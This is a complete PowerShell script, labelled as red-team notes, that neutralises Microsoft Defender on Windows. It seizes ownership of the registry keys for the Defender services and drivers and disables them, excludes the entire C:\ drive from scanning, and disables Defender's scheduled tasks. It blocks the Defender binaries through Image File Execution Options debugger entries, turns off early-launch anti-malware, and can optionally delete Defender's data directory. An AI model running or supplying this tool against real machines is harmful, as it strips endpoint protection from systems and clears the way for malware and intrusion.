<#
.SYNOPSIS
    RedTeamNotes: Native-Only Hardened Microsoft Defender Removal.
.DESCRIPTION
    Native registry manipulation via ACL hijacking. 
    Best executed in Safe Mode to bypass kernel-mode filter drivers (WdFilter).
#>

[CmdletBinding()]
param ([Switch]$PurgeFiles)

Write-Host "[*] RedTeamNotes Native Neutralization initialized." -ForegroundColor Cyan

# --- Helper: Force Ownership and ACL Permissions ---
function Grant-RegistryPermission {
    param([string]$Path)
    $AdminSid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
    try {
        # Take Ownership
        $Key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($Path.Replace("HKLM:\",""), [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::TakeOwnership)
        $Acl = $Key.GetAccessControl([System.Security.AccessControl.AccessControlSections]::None)
        $Acl.SetOwner($AdminSid)
        $Key.SetAccessControl($Acl)
        
        # Grant FullControl
        $Acl = $Key.GetAccessControl()
        $Ar = New-Object System.Security.AccessControl.RegistryAccessRule("Administrators", "FullControl", "Allow")
        $Acl.SetAccessRule($Ar)
        $Key.SetAccessControl($Acl)
        $Key.Close()
        return $true
    } catch {
        return $false
    }
}

# 1. Exclusion Injection
Write-Host "[Step 1/4] Injecting global filesystem exclusions..."
Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue

# 2. Scheduled Tasks Neutralization
Write-Host "[Step 2/4] Disabling RedTeam-relevant Scheduled Tasks..."
Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\*" | Disable-ScheduledTask -ErrorAction SilentlyContinue

# 3. Service Control Hijacking
Write-Host "[Step 3/4] Neutralizing Services and Drivers..."
$TargetServices = @("WinDefend", "WdNisSvc", "Sense", "SecurityHealthService", "WdBoot", "WdFilter", "WdNisDrv")

foreach ($Svc in $TargetServices) {
    $RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\${Svc}"
    if (Test-Path $RegPath) {
        if (Grant-RegistryPermission -Path $RegPath) {
            Set-ItemProperty -Path $RegPath -Name "Start" -Value 4 -ErrorAction SilentlyContinue
            Write-Host "    [-] ${Svc}: Disabled" -ForegroundColor Gray
        } else {
            Write-Host "    [X] ${Svc}: Access Denied (Run in Safe Mode for 100% success)" -ForegroundColor Red
        }
    }
}

# 4. Final Environment Setup
Write-Host "[Step 4/4] Applying IFEO and ELAM policies..."
$Binaries = @("MsMpEng.exe", "MpCmdRun.exe")
foreach ($Bin in $Binaries) {
    $Key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\${Bin}"
    if (-not (Test-Path $Key)) { New-Item $Key -Force | Out-Null }
    Set-ItemProperty $Key -Name "Debugger" -Value "ntsd.exe -d" -ErrorAction SilentlyContinue
}

Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DisableAntiMalware" -Value 1 -ErrorAction SilentlyContinue

if ($PurgeFiles) {
    Write-Host "[!] Purging physical directories..."
    $TargetDir = "C:\ProgramData\Microsoft\Windows Defender"
    takeown /f $TargetDir /r /d y | Out-Null
    icacls $TargetDir /grant administrators:F /t | Out-Null
    Remove-Item $TargetDir -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host "[#] RedTeamNotes: Operation complete." -ForegroundColor Green
